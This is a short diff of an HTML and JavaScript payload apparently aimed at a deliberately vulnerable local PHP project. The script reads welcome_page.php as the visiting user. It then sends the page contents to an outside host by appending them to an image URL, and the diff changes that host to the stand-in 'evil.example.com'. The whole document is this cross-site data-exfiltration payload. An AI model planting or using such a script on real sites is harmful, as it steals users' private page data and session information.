@@ -1,4 +1,4 @@
-<img src="http://plop.com" id="image">
+<img src="" id="image">
 <script>
 const req = new XMLHttpRequest();
 req.open('GET', 'http://localhost/project_vulnerable/welcome_page.php', false);
@@ -6,5 +6,5 @@ req.send(null);
 if (req.status === 200) {
     console.log("%s", req.responseText);
 }
-document.getElementById('image').src = "http://plop.com?secret=" %2B req.responseText;
+document.getElementById('image').src = "http://evil.example.com/?secret=" %2B req.responseText;
 </script>
